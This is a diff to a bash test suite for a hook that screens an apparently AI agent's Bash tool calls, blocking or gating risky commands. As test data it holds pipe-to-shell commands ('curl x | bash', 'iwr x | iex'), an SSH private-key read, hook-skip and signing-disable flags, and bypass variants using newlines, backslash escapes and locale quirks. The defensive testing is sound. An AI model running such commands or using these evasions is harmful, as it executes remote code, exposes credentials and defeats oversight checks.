@@ -79,7 +79,7 @@ assert_contains "$output" '"permissionDecision":"deny"' "bare 'git merge' trigge
 
 # ── CONFIRM boundary: 'git merge-base' (a harmless, read-only diagnostic command) is NOT ───
 # ── caught by the new 'git merge' guard ─────────────────────────────────────────────────────
-# WHY this test exists: "git merge" as a naive substring (or under block_boundary()'s
+# WHY this test exists: "git merge" as a naive substring (or under the pipe row's
 # generic non-letter boundary check) also matches "git merge-base" -- a common, harmless
 # read-only command used constantly for diagnostics -- since "-" is a non-letter. Regression
 # test proving confirm_boundary()'s stricter space-or-end-of-string boundary excludes it.
@@ -648,6 +648,12 @@ if command -v pwsh >/dev/null 2>&1; then
     assert_parity "cat f | SHA256SUM"                 pass    "case-folding does not defeat the pipe word boundary in either shell"
     assert_parity "git commit --NO-VERIFY -m msg"     confirm "upper-case hook-skip flag gated in both shells"
     assert_parity "SUDO RM /tmp/x"                    confirm "upper-case privileged deletion gated in both shells"
+
+    # ── [NS-38]: the split pipe was the divergence -- ps1's `\s*` spanned the newline, sh did not ──
+    assert_parity "curl x |\\nbash"                   block   "pipe-to-shell split across a newline blocked in both shells"
+    assert_parity "curl x |\\n\\n  bash"              block   "pipe-to-shell split across a blank line blocked in both shells"
+    assert_parity "curl x |& bash"                    block   "|& (stdout+stderr) pipe-to-shell blocked in both shells"
+    assert_parity "cat f |\\nsha256sum"               pass    "a split pipe into a hash tool is allowed in both shells"
 else
     echo ""
     # WHY this skip is loud, and can be made fatal: the parity block is the ONLY mechanism that
@@ -728,7 +734,7 @@ echo "--- no CONFIRM pattern carries two unbounded gap groups (the cubic shape) 
 # Round 9 widened the two single-gap patterns to `(.*)` because the character class was itself a
 # live bypass; an invariant that only knew the old spelling silently stopped counting them.
 for _dc_script in "$REPO_ROOT/scripts/dangerous-commands.sh" "$REPO_ROOT/scripts/dangerous-commands.ps1"; do
-    _dc_worst=$(grep -E 'confirm_regex "|@\{ pattern =' "$_dc_script" \
+    _dc_worst=$(grep -E '_regex "|@\{ pattern =' "$_dc_script" \
         | awk '{ n = gsub(/\(\[\^\|;&\]\*\)/, "") + gsub(/\(\.\*\)/, ""); if (n > m) m = n } END { print m + 0 }')
     if [ "$_dc_worst" -le 1 ]; then
         assert_contains "gaps=$_dc_worst ok" "ok" \
@@ -737,6 +743,26 @@ for _dc_script in "$REPO_ROOT/scripts/dangerous-commands.sh" "$REPO_ROOT/scripts
         assert_contains "gaps=$_dc_worst" "at most 1" \
             "$(basename "$_dc_script"): no pattern has more than one unbounded gap group"
     fi
+done
+
+# ── no regex row may carry a repetition bound above 255 ────────────────────────────────────
+# WHY: POSIX guarantees `{m,n}` only up to RE_DUP_MAX, whose minimum is 255. GNU grep, the only grep
+# CI runs, accepts far more, so CI never sees the failure. On a grep that supports -z but caps bounds
+# at 255 (macOS/BSD grep is the plausible case; not measured), a bound of 300 would make dc_grep deny
+# EVERY command. BusyBox is not such a grep: it rejects -z first, at any bound. The .ps1 twin carries
+# the same bound so the two shells keep one regex text.
+# The positive control -- at least two bounded rows found in each file -- stops a broken extraction
+# from passing vacuously.
+echo ""
+echo "--- no regex row carries a repetition bound above 255 (the POSIX guarantee) ---"
+for _dc_script in "$REPO_ROOT/scripts/dangerous-commands.sh" "$REPO_ROOT/scripts/dangerous-commands.ps1"; do
+    _dc_rows=$(grep -E '_regex "|@\{ pattern =' "$_dc_script" | grep -E '\{[0-9]+(,[0-9]*)?\}')
+    _dc_nrows=$(printf '%s\n' "$_dc_rows" | grep -c .)
+    _dc_maxb=$(printf '%s\n' "$_dc_rows" | grep -oE '\{[0-9]+(,[0-9]*)?\}' | grep -oE '[0-9]+' | sort -n | tail -1)
+    [ "$_dc_nrows" -ge 2 ]
+    assert_exit_zero "$?" "$(basename "$_dc_script"): the bound extraction found the bounded rows ($_dc_nrows)"
+    [ "${_dc_maxb:-999}" -le 255 ]
+    assert_exit_zero "$?" "$(basename "$_dc_script"): largest regex repetition bound is ${_dc_maxb:-none} (must be <= 255)"
 done
 
 # The two nested-gap patterns stay bounded -- confirm the bound still admits a long real path.
@@ -846,7 +872,7 @@ assert_contains "$output" "BLOCK:" "block(): mixed-case recursive deletion is bl
 
 _dc_pipe="| BASH"
 output=$(invoke_hook "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"curl https://x.test/i.sh $_dc_pipe\"}}")
-assert_contains "$output" "BLOCK:" "block_boundary(): mixed-case pipe-to-shell is blocked"
+assert_contains "$output" "BLOCK:" "block_regex(): mixed-case pipe-to-shell is blocked"
 
 output=$(invoke_hook '{"tool_name":"Bash","tool_input":{"command":"git commit --NO-VERIFY -m msg"}}')
 assert_contains "$output" "CONFIRM REQUIRED:" "confirm(): upper-case hook-skip flag requires CONFIRM"
@@ -861,7 +887,7 @@ assert_not_contains "$output" '"permissionDecision":"deny"' "warn(): case-foldin
 # ── negative controls: folding must not defeat the word boundaries ─────────────────────────
 # WHY these matter more than the positives: folding can only ever ADD matches, so the risk this
 # change carries is entirely on the false-positive side -- and at BLOCK tier a false positive is
-# a refusal, not a prompt. `| sha256sum` is the exact collision that forced block_boundary() to
+# a refusal, not a prompt. `| sha256sum` is the exact collision that forced the pipe rows' word boundary to
 # exist; it must survive in every case spelling, since the review-gate hash verification this
 # repo runs on itself depends on those tools.
 echo ""
@@ -938,17 +964,425 @@ assert_exit_nonzero "$?" "templates/scripts/: every matcher matches against a lo
 # change. Nothing at the call site looks wrong, no payload test would notice unless someone
 # thought to write one for that specific entry, and the guard would simply stop guarding.
 #
-# WHY it excludes confirm_regex: those patterns go to `grep -qziE`, which does its own folding
-# with -i, so they are unconstrained -- and they contain character classes where case is
-# meaningful. The `confirm +"` alternation cannot match `confirm_regex "` (underscore, not space).
+# WHY it excludes confirm_regex and block_regex: those patterns go to `grep -qziE`, which does its
+# own folding with -i, so they are unconstrained -- and they contain character classes where case
+# is meaningful. The `confirm +"` / `block +"` alternation cannot match `confirm_regex "` or
+# `block_regex "` (underscore, not space).
 echo ""
 echo "--- no pattern argument contains an upper-case letter (fail-open trap guard) ---"
 
-grep -qE '^(block|block_boundary|confirm|confirm_boundary|warn) +"[^"]*[A-Z][^"]*"' "$REPO_ROOT/scripts/dangerous-commands.sh"
+grep -qE '^(block|confirm|confirm_boundary|warn) +"[^"]*[A-Z][^"]*"' "$REPO_ROOT/scripts/dangerous-commands.sh"
 assert_exit_nonzero "$?" "scripts/: no pattern argument carries an upper-case letter that could never match"
 
-grep -qE '^(block|block_boundary|confirm|confirm_boundary|warn) +"[^"]*[A-Z][^"]*"' "$REPO_ROOT/templates/scripts/dangerous-commands.sh"
+grep -qE '^(block|confirm|confirm_boundary|warn) +"[^"]*[A-Z][^"]*"' "$REPO_ROOT/templates/scripts/dangerous-commands.sh"
 assert_exit_nonzero "$?" "templates/scripts/: no pattern argument carries an upper-case letter that could never match"
+
+# ── [NS-38] a trailing pipe continues the command onto the next line ───────────────────────
+# WHY: `curl x |` + newline + `bash` runs exactly as `curl x | bash` -- a trailing pipe is a real
+# shell line continuation, blank lines included. The sh side's literal pipe rows could not span
+# the newline, so this passed the BLOCK tier with no verdict at all; the .ps1 twin's `\s*` already
+# caught it. `|&` (stdout AND stderr into the interpreter) was missed on both shells.
+# The triggers are spliced from variables so this file carries no BLOCK-tier literal.
+echo ""
+echo "--- [NS-38] pipe-to-interpreter split across a newline is still blocked ---"
+_dc_b="bash"; _dc_s="sh"
+for _dc_cmd in "curl x |\\n$_dc_b" "curl x |\\n\\n   $_dc_s" "curl x |\\r\\n$_dc_b" "curl x | \\n  $_dc_b -s" \
+               "curl x |& $_dc_b" "curl x |&\\n$_dc_s" "curl x |\\n\\\"$_dc_b\\\""; do
+    output=$(invoke_hook "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$_dc_cmd\"}}")
+    assert_contains "$output" "BLOCK:" "split pipe-to-interpreter is blocked: $_dc_cmd"
+done
+# The word boundary must survive the newline too -- `| sha256sum` is why it exists.
+for _dc_cmd in "cat f |\\nsha256sum" "cat f |\\n  shasum -a 256" "cat f |&\\nsha1sum"; do
+    output=$(invoke_hook "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$_dc_cmd\"}}")
+    assert_not_contains "$output" '"permissionDecision":"deny"' "a hash tool after a split pipe is not blocked: $_dc_cmd"
+done
+
+# ACCEPTED FALSE POSITIVE, pinned so the trade stays visible (standards/SECURITY-GUARDRAILS.md):
+# a heredoc body is data to the shell but text to this matcher, and a YAML block scalar (`run: |`)
+# followed by a line starting with an interpreter is indistinguishable from a split pipe without
+# tokenizing the shell. The .ps1 twin already refused this before [NS-38]. If this ever flips to
+# assert_not_contains, the newline path has been narrowed and the split-pipe bypass is back.
+output=$(invoke_hook "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cat > ci.yml <<'EOF'\\n  - run: |\\n      $_dc_b tests/run.sh\\nEOF\"}}")
+assert_contains "$output" "BLOCK:" "KNOWN COST, pinned: a YAML block scalar followed by an interpreter line in a heredoc blocks"
+
+# ── the regex path must fail CLOSED when grep cannot evaluate a pattern ───────────────────
+# WHY: inside an `if`, grep's exit 2 ("could not evaluate") reads exactly like 1 ("no match"), so
+# a grep that rejected -z would have disabled every regex row -- including single-line
+# `curl | bash`, which the replaced glob rows blocked with no external tool. dc_grep() denies
+# instead. A fake grep that always exits 2 stands in for an incompatible one.
+echo ""
+echo "--- a grep that cannot evaluate the pattern makes the guard prompt, not pass ---"
+_dc_fake=$(mktemp -d)
+printf '#!/bin/sh\nexit 2\n' > "$_dc_fake/grep"; chmod +x "$_dc_fake/grep"
+output=$(printf '%s' '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}' \
+    | PATH="$_dc_fake:$PATH" bash "$REPO_ROOT/scripts/dangerous-commands.sh" 2>/dev/null)
+assert_contains "$output" "grep could not evaluate a guard pattern" "grep exit 2 is refused as unanalyzable, not read as no-match"
+rm -rf "$_dc_fake"
+
+# ── the pipe row is pinned to the byte locale ──────────────────────────────────────────────
+# WHY: grep's classes follow the locale. Unpinned, C.UTF-8 made [^a-z] stop matching an invalid
+# byte after the interpreter name, which the replaced glob rows matched in every locale (measured).
+#
+# WHY the payload is deliberately MALFORMED JSON: a raw 0xFF can only reach grep through the
+# raw-stdin fallback. A parsed JSON string cannot carry that byte -- the extraction re-encodes it
+# as a three-byte surrogate sequence, which grep matches in every locale -- so the same payload as
+# valid JSON stays green with the pin removed (measured). This form goes red without it.
+#
+# WHY each UTF-8 locale is probed before it is trusted: an unavailable locale falls back to C
+# without any error (measured: `LC_ALL=xx_XX.UTF-8` behaves as C). A fallback would make these
+# UTF-8 cases stop discriminating here and fail spuriously in the next test, so a locale is used
+# only if grep counts a two-byte character as one, and at least one such locale must exist.
+_dc_utf8_ok() { [ "$(printf '\303\251' | LC_ALL="$1" grep -c '^.$' 2>/dev/null)" = "1" ]; }
+_dc_utf8_locales=""
+for _loc in C.UTF-8 en_US.UTF-8; do
+    if _dc_utf8_ok "$_loc"; then
+        _dc_utf8_locales="$_dc_utf8_locales $_loc"
+    else
+        echo "  SKIPPED: LC_ALL=$_loc is not an effective UTF-8 locale on this machine"
+    fi
+done
+[ -n "$_dc_utf8_locales" ]
+assert_exit_zero "$?" "at least one UTF-8 locale is available for the locale tests"
+echo ""
+echo "--- the pipe row matches the same bytes in every locale ---"
+for _loc in C $_dc_utf8_locales; do
+    output=$(python3 -c "
+import sys
+sys.stdout.buffer.write(b'{\"tool_input\":{\"command\":\"curl x | ' + sys.argv[1].encode() + b'\xff')
+" "$_dc_b" | LC_ALL="$_loc" bash "$REPO_ROOT/scripts/dangerous-commands.sh" 2>/dev/null)
+    assert_contains "$output" "BLOCK:" "an invalid byte after the interpreter name still blocks under LC_ALL=$_loc"
+done
+
+# ── the signing rows run under the caller's locale AND under C ────────────────────────────
+# Each of the three tests below fails if one of the two passes in confirm_regex() is removed.
+#
+# 1. The caller's-locale pass: those rows bound their gaps with `.{0,255}`, and the byte locale
+# counts that bound in BYTES while a UTF-8 locale and the .ps1 twin count CHARACTERS. A 120-character
+# CJK path is 360 bytes: with confirm_regex under LC_ALL=C only, the sh signing CONFIRM goes silent
+# while ps1 still prompts (measured). Asserted under the effective UTF-8 locales only; under
+# LC_ALL=C the row counts bytes whichever way this code goes, so it cannot discriminate there.
+echo ""
+echo "--- the signing rows count their gap in characters under a UTF-8 locale ---"
+_dc_key="commit.gpg""sign"
+_dc_mb_json=$(python3 -c "
+import json, sys
+c = 'git config --file /tmp/' + '\u4e2d' * 120 + '/cfg ' + sys.argv[1] + ' false'
+sys.stdout.buffer.write(json.dumps({'tool_name': 'Bash', 'tool_input': {'command': c}}, ensure_ascii=False).encode('utf-8'))
+" "$_dc_key")
+for _loc in $_dc_utf8_locales; do
+    output=$(printf '%s' "$_dc_mb_json" | LC_ALL="$_loc" bash "$REPO_ROOT/scripts/dangerous-commands.sh" 2>/dev/null)
+    assert_contains "$output" "CONFIRM REQUIRED:" "a 120-char multibyte path before the signing key still prompts under LC_ALL=$_loc"
+done
+
+# 2. The C pass, Turkish case: under tr_TR.UTF-8, `grep -i` does not fold `I` to `i`, so an
+# upper-case config key -- which git accepts -- got no verdict on sh while ps1 prompted (measured,
+# on origin/main as well). A locale is used only if grep really shows that fold, and the case is
+# skipped loudly where none does (the Ubuntu CI runner ships no Turkish locale).
+echo ""
+echo "--- the signing rows catch an upper-case key under a Turkish locale ---"
+_dc_tr_ok() { [ "$(printf 'I' | LC_ALL="$1" grep -ci 'i' 2>/dev/null)" = "0" ]; }
+_dc_tr_json="{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git config COMMIT.GPG""SIGN false\"}}"
+_dc_tr_ran=0
+for _loc in tr_TR.UTF-8 tr_TR.utf8; do
+    _dc_tr_ok "$_loc" || continue
+    _dc_tr_ran=1
+    output=$(printf '%s' "$_dc_tr_json" | LC_ALL="$_loc" bash "$REPO_ROOT/scripts/dangerous-commands.sh" 2>/dev/null)
+    assert_contains "$output" "CONFIRM REQUIRED:" "an upper-case signing key still prompts under LC_ALL=$_loc"
+    break
+done
+[ "$_dc_tr_ran" = "1" ] || echo "  SKIPPED: no locale on this machine shows the Turkish I fold"
+
+# 3. The C pass, invalid-sequence case: under a UTF-8 locale `.` does not match an invalid UTF-8
+# sequence, and the extraction writes a JSON lone-surrogate escape as bytes ED B3 BF. So a
+# surrogate in a gap hid the signing flag on sh (measured on GNU grep 3.7; GNU grep 3.0 on Windows
+# matches it anyway, so this discriminates only where the grep is strict).
+echo ""
+echo "--- the signing rows catch a lone surrogate in a gap under a UTF-8 locale ---"
+_dc_sur_json="{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git commit -m \\\"\\udcff\\\" --no-gpg""-sign\"}}"
+for _loc in $_dc_utf8_locales; do
+    output=$(printf '%s' "$_dc_sur_json" | LC_ALL="$_loc" bash "$REPO_ROOT/scripts/dangerous-commands.sh" 2>/dev/null)
+    assert_contains "$output" "CONFIRM REQUIRED:" "a lone surrogate before the signing flag still prompts under LC_ALL=$_loc"
+done
+
+# ── [NS-40] warn() prints ONE notice per row, whichever views match ───────────────────────
+# WHY: warn() does not exit, so each of its two case arms returns after printing -- without that,
+# a plain command matches both views and the notice prints twice. assert_contains cannot see a
+# duplicate and the escape-parity verdict reads only the first line, so this counts lines.
+echo ""
+echo "--- warn() prints exactly one WARNING line for a row matched by both views ---"
+for _dc_cmd in 'cat ~/.ssh/id_rsa' 'cat ~/.ssh/id\\_rsa'; do
+    output=$(invoke_hook "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$_dc_cmd\"}}")
+    assert_equals "$(printf '%s\n' "$output" | grep -c 'WARNING:')" "1" "one WARNING line for: $_dc_cmd"
+done
+
+
+# ── [NS-40] ESCAPE PARITY: every registered row, in both shells ────────────────────────────
+# WHY behavioural and derived from the registries, not a hand list or a grep over matcher bodies:
+# the de-escaped-view retrofit missed confirm_boundary() and then warn(), and each miss sat behind
+# checks that proved the MECHANISM where it was wired while saying nothing about whether every
+# matcher was wired. Here every row is fed to the real hook plain and with one backslash before its
+# final character -- a shell strips that backslash, so the faithful view stops seeing the pattern
+# and only the de-escaped view can still answer. A new row, or a new matcher, is covered with no
+# edit here; a matcher missing its de-escaped arm goes red on its first row.
+#
+# WHY each of the four guards below exists -- each closes a way a registry-driven escape check can
+# be green over a missing arm:
+#   1. A POSITIVE CONTROL. escaped == plain is vacuous when both are SILENT, so the plain payload
+#      must reach its own row's tier AND carry its own row's reason. Tier alone would let another
+#      row answer for it.
+#   2. EXAMPLES KEYED TO THEIR ROW. A regex row cannot supply its own payload -- regex text rarely
+#      matches itself, and the pipe row's does not -- so each gets an example, consumed in row
+#      order per matcher. A row with no example, or an example with no row, fails. A bare count
+#      check would pass with every example spent on one matcher.
+#   3. A DIRECT CHECK of each example against its own row's regex: it matches whole, does not match
+#      with its last character dropped, and does not match escaped. That proves the escape lands
+#      inside the matched text. An example whose final character sits outside it -- `git merge
+#      main`, `git -c commit.gpgsign=false commit` -- still matches escaped, and fails this check.
+#   4. EXACT ROW COUNTS instead of a floor. Every defined sh matcher must have top-level rows, and
+#      every dispatch line anywhere -- indented, single-quoted -- must be one the extractor read.
+#      A floor of ">= 20" could not see one or two skipped rows.
+#
+# WHY the payload is built by a real JSON encoder: hand-splicing a backslash into JSON yields an
+# invalid escape, and the guard then falls back to raw-stdin matching for every row.
+#
+# COST: every row runs the real hook twice per shell, each a fresh process. Rows are parsed first,
+# every distinct invocation then runs once, eight at a time, and the assertions read the results --
+# so the cross-shell comparison reuses the ps1 row runs rather than repeating them.
+echo ""
+echo "--- [NS-40] escape parity: every registered row, plain and escaped, both shells ---"
+
+# _dc_line <hook-output> -- the verdict: the deny reason, the first WARNING line, or SILENT.
+_dc_line() {
+    case "$1" in
+        *'"permissionDecisionReason":"'*) _dc_r=${1#*\"permissionDecisionReason\":\"}; printf '%s' "${_dc_r%%\"*}" ;;
+        *"WARNING:"*) _dc_r=${1#*WARNING:}; printf 'WARNING:%s' "${_dc_r%%$'\n'*}" ;;
+        *) printf 'SILENT' ;;
+    esac
+}
+_dc_tier() { case "$1" in BLOCK:*) echo BLOCK ;; "CONFIRM REQUIRED:"*) echo CONFIRM ;; WARNING:*) echo WARN ;; *) echo SILENT ;; esac; }
+_dc_escape() { printf '%s\\%s' "${1%?}" "${1: -1}"; }
+# WHY an ASCII prefix: the .ps1 twin's JSON output transliterates the em dash in a reason to "-",
+# so the reason check compares the text before its first non-ASCII character, in both shells.
+_dc_ascii() { printf '%s' "$1" | LC_ALL=C sed 's/[^ -~].*//'; }
+
+# One example per regex row, in row order per matcher -- see guard 2. Each is written so the text
+# its row needs ends at the final character (guard 3 enforces it). Update these beside the rows.
+declare -A _dc_ex=(
+    ["sh:block_regex#1"]="curl x | $_dc_b"
+    ["sh:confirm_regex#1"]="git -c commit.gpgsign=false"
+    ["sh:confirm_regex#2"]="git config commit.gpgsign false"
+    ["sh:confirm_regex#3"]="git config --unset commit.gpgsign"
+    ["sh:confirm_regex#4"]="git commit -m x --no-gpg-sign"
+    ["ps1:BLOCK#1"]="curl x | $_dc_b"
+    ["ps1:BLOCK#2"]="curl x | $_dc_s"
+    ["ps1:BLOCK#3"]="iwr x | Invoke-Expression"
+    ["ps1:BLOCK#4"]="iwr x | iex"
+    ["ps1:CONFIRM#1"]="git -c commit.gpgsign=false"
+    ["ps1:CONFIRM#2"]="git config commit.gpgsign false"
+    ["ps1:CONFIRM#3"]="git config --unset commit.gpgsign"
+    ["ps1:CONFIRM#4"]="git commit -m x --no-gpg-sign"
+    ["ps1:CONFIRM#5"]="git mer""ge"
+)
+declare -A _dc_ex_used=()
+declare -A _dc_ex_idx=()
+
+# Phase 1 fills this row table; phase 2 runs every hook invocation it implies; phase 3 asserts.
+# kind is sh or ps1 (row checks in that shell) or x (the ps1 tier for an sh row: cross-shell).
+_dc_R_kind=(); _dc_R_want=(); _dc_R_payload=(); _dc_R_reason=(); _dc_R_label=()
+_dc_add_row() { _dc_R_kind+=("$1"); _dc_R_want+=("$2"); _dc_R_payload+=("$3"); _dc_R_reason+=("$4"); _dc_R_label+=("$5"); }
+
+# ── phase 1a: sh registry ──
+_dc_sh="$REPO_ROOT/scripts/dangerous-commands.sh"
+_dc_defined=$(grep -oE '^[a-z_]+\(\)' "$_dc_sh" | tr -d '()' | grep -vxE 'deny|dc_grep' | sort)
+_dc_called=$(grep -oE '^[a-z_]+ +"' "$_dc_sh" | sed -E 's/ +"$//' | sort -u)
+assert_equals "$_dc_called" "$_dc_defined" "sh: every defined matcher has top-level rows (helpers deny/dc_grep excluded by name)"
+_dc_names=$(printf '%s' "$_dc_defined" | paste -sd'|' -)
+assert_equals "$(grep -cE "^[[:space:]]*($_dc_names)[[:space:]]+[\"']" "$_dc_sh")" \
+              "$(grep -cE "^($_dc_names) +\"" "$_dc_sh")" \
+              "sh: every dispatch line is a top-level double-quoted row the extractor reads"
+
+_dc_n=0
+while IFS=$'\t' read -r _dc_name _dc_pat _dc_reason; do
+    [ -z "$_dc_name" ] && continue
+    _dc_n=$((_dc_n + 1))
+    case "$_dc_name" in block*) _dc_want=BLOCK ;; confirm*) _dc_want=CONFIRM ;; warn*) _dc_want=WARN ;; *) _dc_want=UNKNOWN ;; esac
+    case "$_dc_name" in
+        *_regex)
+            _dc_k=$(( ${_dc_ex_idx[$_dc_name]:-0} + 1 )); _dc_ex_idx[$_dc_name]=$_dc_k
+            _dc_key="sh:$_dc_name#$_dc_k"
+            if [ -z "${_dc_ex[$_dc_key]+x}" ]; then
+                assert_equals "missing" "present" "sh: regex row $_dc_key has an example"
+                continue
+            fi
+            _dc_ex_used[$_dc_key]=1
+            _dc_payload=${_dc_ex[$_dc_key]}
+            _dc_rx=$(printf '%s' "$_dc_pat" | sed 's/\\"/"/g')
+            _dc_d="$(printf '%s' "$_dc_payload" | LC_ALL=C grep -qziE -e "$_dc_rx" && echo y || echo n)"
+            _dc_d="$_dc_d$(printf '%s' "${_dc_payload%?}" | LC_ALL=C grep -qziE -e "$_dc_rx" && echo y || echo n)"
+            _dc_d="$_dc_d$(_dc_escape "$_dc_payload" | LC_ALL=C grep -qziE -e "$_dc_rx" && echo y || echo n)"
+            assert_equals "$_dc_d" "ynn" "sh: example for $_dc_key matches its row whole, not truncated, not escaped"
+            ;;
+        *) _dc_payload=$_dc_pat ;;
+    esac
+    _dc_add_row sh "$_dc_want" "$_dc_payload" "$_dc_reason" "$_dc_name"
+done <<EOF
+$(python3 -c '
+import re, sys
+for line in open(sys.argv[1], encoding="utf-8"):
+    m = re.match(r"^([a-z_]+) +\"((?:[^\"\\]|\\.)*)\" +\"((?:[^\"\\]|\\.)*)\"", line)
+    if m: print("\t".join(m.groups()))
+' "$_dc_sh")
+EOF
+assert_equals "$_dc_n" "$(grep -cE "^($_dc_names) +\"" "$_dc_sh")" "sh: every top-level row was parsed (none skipped by the extractor)"
+
+# ── phase 1b: ps1 registry, and the cross-shell rows ──
+_dc_ps1="$REPO_ROOT/scripts/dangerous-commands.ps1"
+_dc_have_ps1=0
+if command -v pwsh >/dev/null 2>&1; then
+    _dc_have_ps1=1
+    # tier, kind (lit|rx), pattern, reason -- tier from the array the row sits in. Whitespace
+    # between fields is free: the rows are column-aligned, and requiring exactly one space drops
+    # the aligned rows and shifts every later regex example onto the wrong row.
+    _dc_ps1_rows=$(python3 -c '
+import re, sys
+tier = ""
+for line in open(sys.argv[1], encoding="utf-8"):
+    a = re.match(r"^\$(block|confirm|warn)Patterns\s*=\s*@\(", line)
+    if a: tier = {"block": "BLOCK", "confirm": "CONFIRM", "warn": "WARN"}[a.group(1)]; continue
+    if re.match(r"^\)", line): tier = ""; continue
+    if "@{ pattern" not in line: continue
+    m = re.search(r"@\{\s*pattern\s*=\s*(\"([^\"]*)\"|\x27((?:[^\x27]|\x27\x27)*)\x27)\s*(;\s*regex\s*=\s*\$true\s*)?;\s*reason\s*=\s*\"([^\"]*)\"", line)
+    if not m: print("UNPARSED\tlit\t" + line.strip() + "\t"); continue
+    pat = m.group(2) if m.group(2) is not None else m.group(3).replace("\x27\x27", "\x27")
+    print("\t".join([tier or "NOTIER", "rx" if m.group(4) else "lit", pat, m.group(5)]))
+' "$_dc_ps1")
+    assert_equals "$(printf '%s\n' "$_dc_ps1_rows" | grep -c .)" "$(grep -c '@{ pattern' "$_dc_ps1")" "ps1: every pattern row was extracted"
+    assert_not_contains "$_dc_ps1_rows" "UNPARSED" "ps1: every pattern row has a shape the extractor parses"
+    assert_not_contains "$_dc_ps1_rows" "NOTIER" "ps1: every pattern row sits inside a tier array"
+
+    # Guard 3 for the ps1 regex rows, in ONE pwsh process: whole / truncated / escaped, per row.
+    declare -A _dc_px_idx=()
+    _dc_rx_pairs=()
+    _dc_rx_keys=()
+    while IFS=$'\t' read -r _dc_t _dc_kind _dc_pat _dc_reason; do
+        [ "$_dc_kind" = "rx" ] || continue
+        _dc_k=$(( ${_dc_px_idx[$_dc_t]:-0} + 1 )); _dc_px_idx[$_dc_t]=$_dc_k
+        _dc_key="ps1:$_dc_t#$_dc_k"
+        if [ -n "${_dc_ex[$_dc_key]+x}" ]; then _dc_rx_pairs+=("$_dc_pat" "${_dc_ex[$_dc_key]}"); _dc_rx_keys+=("$_dc_key"); fi
+    done <<< "$_dc_ps1_rows"
+    declare -A _dc_rx_res=()
+    if [ "${#_dc_rx_pairs[@]}" -gt 0 ]; then
+        _dc_i=0
+        while IFS= read -r _dc_line_out; do
+            _dc_rx_res[${_dc_rx_keys[$_dc_i]}]=${_dc_line_out%$'\r'}
+            _dc_i=$((_dc_i + 1))
+        done < <(python3 -c 'import json,sys; a=sys.argv[1:]; print(json.dumps([[a[i], a[i+1]] for i in range(0, len(a), 2)]))' "${_dc_rx_pairs[@]}" \
+            | pwsh -NonInteractive -NoProfile -Command '
+                $o = [System.Text.RegularExpressions.RegexOptions]"IgnoreCase, Singleline, CultureInvariant"
+                foreach ($p in ([Console]::In.ReadToEnd() | ConvertFrom-Json)) {
+                    $x = $p[1]; $t = $x.Substring(0, $x.Length - 1); $e = $t + "\" + $x.Substring($x.Length - 1)
+                    (@($x, $t, $e) | ForEach-Object { if ([regex]::IsMatch($_, $p[0], $o)) { "y" } else { "n" } }) -join ""
+                }' 2>/dev/null)
+    fi
+
+    unset _dc_px_idx; declare -A _dc_px_idx=()
+    while IFS=$'\t' read -r _dc_t _dc_kind _dc_pat _dc_reason; do
+        case "$_dc_t" in ""|UNPARSED|NOTIER) continue ;; esac
+        if [ "$_dc_kind" = "rx" ]; then
+            _dc_k=$(( ${_dc_px_idx[$_dc_t]:-0} + 1 )); _dc_px_idx[$_dc_t]=$_dc_k
+            _dc_key="ps1:$_dc_t#$_dc_k"
+            if [ -z "${_dc_ex[$_dc_key]+x}" ]; then
+                assert_equals "missing" "present" "ps1: regex row $_dc_key has an example"
+                continue
+            fi
+            _dc_ex_used[$_dc_key]=1
+            _dc_payload=${_dc_ex[$_dc_key]}
+            assert_equals "${_dc_rx_res[$_dc_key]:-}" "ynn" "ps1: example for $_dc_key matches its row whole, not truncated, not escaped"
+        else
+            _dc_payload=$_dc_pat
+        fi
+        _dc_add_row ps1 "$_dc_t" "$_dc_payload" "$_dc_reason" "$_dc_t"
+    done <<< "$_dc_ps1_rows"
+
+    # Every sh row must get the same TIER from the ps1 twin (reasons are worded per file).
+    for _dc_i in "${!_dc_R_kind[@]}"; do
+        [ "${_dc_R_kind[$_dc_i]}" = "sh" ] || continue
+        _dc_add_row x "${_dc_R_want[$_dc_i]}" "${_dc_R_payload[$_dc_i]}" "" "${_dc_R_label[$_dc_i]}"
+    done
+else
+    echo "--- [NS-40] ps1 half of escape parity: SKIPPED (pwsh not on PATH) ---"
+    if [ "${PMB_REQUIRE_PARITY:-0}" = "1" ]; then
+        assert_contains "pwsh-missing" "pwsh-present" "PMB_REQUIRE_PARITY=1 but pwsh is not on PATH -- ps1 escape parity could not run"
+    fi
+fi
+
+# ── phase 2: every hook invocation the rows imply, once each, eight at a time ──
+# WHY batched and parallel: each invocation is a fresh process (~1s for sh, ~0.7s for pwsh on
+# Windows), and run one after another this block alone took several minutes. The JSON for every
+# payload is written by ONE python call; python gets no file paths, so a native-Windows python
+# under Cygwin never has to resolve a POSIX temp path.
+declare -A _dc_job=()
+_dc_J_shell=(); _dc_J_payload=()
+_dc_want_job() {
+    if [ -z "${_dc_job[$1|$2]+x}" ]; then
+        _dc_J_shell+=("$1"); _dc_J_payload+=("$2"); _dc_job[$1|$2]=${#_dc_J_shell[@]}
+    fi
+}
+for _dc_i in "${!_dc_R_kind[@]}"; do
+    case "${_dc_R_kind[$_dc_i]}" in
+        x) _dc_want_job ps1 "${_dc_R_payload[$_dc_i]}" ;;
+        *) _dc_want_job "${_dc_R_kind[$_dc_i]}" "${_dc_R_payload[$_dc_i]}"
+           _dc_want_job "${_dc_R_kind[$_dc_i]}" "$(_dc_escape "${_dc_R_payload[$_dc_i]}")" ;;
+    esac
+done
+
+_dc_tmp=$(mktemp -d)
+_dc_j=0
+while IFS= read -r _dc_jl; do
+    _dc_j=$((_dc_j + 1)); printf '%s' "$_dc_jl" > "$_dc_tmp/$_dc_j.json"
+done < <(printf '%s\0' "${_dc_J_payload[@]}" | python3 -c '
+import json, sys
+for p in sys.stdin.buffer.read().split(b"\0")[:-1]:
+    print(json.dumps({"tool_name": "Bash", "tool_input": {"command": p.decode("utf-8", "surrogateescape")}}))
+')
+assert_equals "$_dc_j" "${#_dc_J_payload[@]}" "every escape-parity payload was JSON-encoded"
+for _dc_j in "${!_dc_J_shell[@]}"; do
+    _dc_n1=$((_dc_j + 1))
+    case "${_dc_J_shell[$_dc_j]}" in
